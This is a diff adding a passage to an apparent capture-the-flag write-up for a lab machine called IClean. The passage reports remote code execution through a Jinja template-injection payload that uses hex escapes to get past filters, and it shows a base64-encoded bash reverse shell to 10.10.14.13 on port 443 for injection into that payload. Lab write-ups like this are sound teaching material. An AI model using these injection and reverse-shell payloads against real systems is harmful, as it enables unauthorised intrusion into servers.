@@ -267,6 +267,27 @@ Payload -> {{request|attr('application')|attr('\x5f\x5fglobals\x5f\x5f')|attr('\
 
 <br />
 
+![18](../../../assets/images/IClean/18.png)
+
+<br />
+
+Perfect! We have an RCE, we are going to establish a Reverse Shell to gain access to the Machine.
+
+In this case, the typical bash Reverse Shell doesn't work, I think it's because some characters conflict, so to avoid this we'll base64 encode our payload:
+
+<br />
+
+```bash
+❯ echo -n 'bash -c "bash -i >& /dev/tcp/10.10.14.13/443 0>&1"' | base64 -w 0; echo
+YmFzaCAtYyAiYmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMy80NDMgMD4mMSI=
+```
+
+<br />
+
+Once we have our payload encoded, we will simply have to enter it into the jinja payload and listen on port 443 to receive the connection when sending the request to the server:
+
+<br />
+
 
 
 <br />
